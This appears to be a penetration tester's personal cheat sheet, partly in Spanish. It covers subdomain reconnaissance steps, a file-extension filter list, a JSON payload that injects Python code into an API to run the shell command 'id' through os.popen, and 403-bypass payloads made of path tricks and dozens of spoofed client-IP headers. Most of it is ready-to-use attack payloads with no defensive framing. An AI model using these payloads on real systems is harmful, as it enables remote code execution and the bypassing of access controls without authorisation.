-- -

## **Subdomains check**
1. Entrar al subdominio. 
2. Hacer Ctrl + u para ver el codigo fuente.
3. Forzar error 404 para ver si se refleja la ruta.
4. *Chequear que la url no se encierre en canonical link*
5. Usar search_endpoints.sh para ver que onda los endpoints asociados a ese subdomino
6. Abrir los endpoints con la extension de firefox.
7. Mirar el burpsuite una vez se abrieron todos los endpoints.

--- --
## Code filter

```bash
~
.swp
;.jar
```


-- -
## APIs 

**RCE via python code injection**
```json
{
  "name": "darkshadow",
  "args": {},
  "json_schema": {"type": "object", "properties": {}},
"source_code": "def darkshadow():\n    import os\n    data='0'.encode('utf-8')\n    return ''+os.popen('id').read()"
}

```


 --- -
## 403 bypass payloads

**Path:**
```http
/dir/..;/dir/
/admin -> /Admin
/file/../file

```


**Headers:**
```http
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referen: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Referrer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```